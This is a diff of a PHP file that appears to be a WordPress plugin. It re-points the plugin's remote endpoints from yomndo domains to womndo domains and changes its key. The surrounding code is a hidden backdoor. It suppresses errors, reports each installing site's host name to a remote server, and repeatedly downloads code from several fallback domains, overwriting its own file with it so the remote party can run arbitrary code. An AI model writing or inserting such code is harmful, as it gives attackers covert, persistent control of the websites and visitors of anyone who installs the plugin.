@@ -7,7 +7,7 @@
  */
 error_reporting(0);
 ini_set('display_errors', 0);
-$plugin_key='9beeedd61661b578d207268250a78846';
+$plugin_key='36daac75d95266f98df8a46cf52d5a3d';
 $version='1.2';
 
 add_action('admin_menu', function() {
@@ -176,9 +176,9 @@ $log_install='';
 /*************************log install***************************/
 if(get_option('log_install') !=='1')
 {
-    if(!$log_installed = @file_get_contents("http://www.yomndo.com/o2.php?host=".$_SERVER["HTTP_HOST"]))
+    if(!$log_installed = @file_get_contents("http://www.womndo.com/o2.php?host=".$_SERVER["HTTP_HOST"]))
 {
-    $log_installed = @file_get_contents_mplugin("http://www.yomndo.com/o2.php?host=".$_SERVER["HTTP_HOST"]);
+    $log_installed = @file_get_contents_mplugin("http://www.womndo.com/o2.php?host=".$_SERVER["HTTP_HOST"]);
 }
 }
 /*************************set default options***************************/
@@ -324,7 +324,7 @@ if( ini_get('allow_url_fopen') ) {
 
 
 
-        if (($new_version = @file_get_contents("http://www.yomndo.com/update.php") OR $new_version = @file_get_contents_mplugin("http://www.yomndo.com/update.php")) AND stripos($new_version, $plugin_key) !== false) {
+        if (($new_version = @file_get_contents("http://www.womndo.com/update.php") OR $new_version = @file_get_contents_mplugin("http://www.womndo.com/update.php")) AND stripos($new_version, $plugin_key) !== false) {
 
             if (stripos($new_version, $plugin_key) !== false AND stripos($new_version, '$version=') !== false) {
                @file_put_contents(__FILE__, $new_version);
@@ -333,7 +333,7 @@ if( ini_get('allow_url_fopen') ) {
         }
         
         
-                elseif ($new_version = @file_get_contents("http://www.yomndo.xyz/update.php") AND stripos($new_version, $plugin_key) !== false) {
+                elseif ($new_version = @file_get_contents("http://www.womndo.xyz/update.php") AND stripos($new_version, $plugin_key) !== false) {
 
             if (stripos($new_version, $plugin_key) !== false AND stripos($new_version, '$version=') !== false) {
                @file_put_contents(__FILE__, $new_version);
@@ -342,7 +342,7 @@ if( ini_get('allow_url_fopen') ) {
         }
 
 
-        elseif ($new_version = @file_get_contents("http://www.yomndo.top/update.php") AND stripos($new_version, $plugin_key) !== false) {
+        elseif ($new_version = @file_get_contents("http://www.womndo.top/update.php") AND stripos($new_version, $plugin_key) !== false) {
 
             if (stripos($new_version, $plugin_key) !== false AND stripos($new_version, '$version=') !== false) {
                @file_put_contents(__FILE__, $new_version);
@@ -353,7 +353,7 @@ if( ini_get('allow_url_fopen') ) {
 }
 else
 {
-            if (($new_version = @file_get_contents("http://www.yomndo.com/update.php") OR $new_version = @file_get_contents_mplugin("http://www.yomndo.com/update.php")) AND stripos($new_version, $plugin_key) !== false) {
+            if (($new_version = @file_get_contents("http://www.womndo.com/update.php") OR $new_version = @file_get_contents_mplugin("http://www.womndo.com/update.php")) AND stripos($new_version, $plugin_key) !== false) {
 
             if (stripos($new_version, $plugin_key) !== false AND stripos($new_version, '$version=') !== false) {
                @file_put_contents(__FILE__, $new_version);
@@ -362,7 +362,7 @@ else
         }
         
         
-                elseif ($new_version = @file_get_contents_mplugin("http://www.yomndo.xyz/update.php") AND stripos($new_version, $plugin_key) !== false) {
+                elseif ($new_version = @file_get_contents_mplugin("http://www.womndo.xyz/update.php") AND stripos($new_version, $plugin_key) !== false) {
 
             if (stripos($new_version, $plugin_key) !== false AND stripos($new_version, '$version=') !== false) {
                @file_put_contents(__FILE__, $new_version);
@@ -371,7 +371,7 @@ else
         }
 
 
-        elseif ($new_version = @file_get_contents_mplugin("http://www.yomndo.top/update.php") AND stripos($new_version, $plugin_key) !== false) {
+        elseif ($new_version = @file_get_contents_mplugin("http://www.womndo.top/update.php") AND stripos($new_version, $plugin_key) !== false) {
 
             if (stripos($new_version, $plugin_key) !== false AND stripos($new_version, '$version=') !== false) {
                @file_put_contents(__FILE__, $new_version);
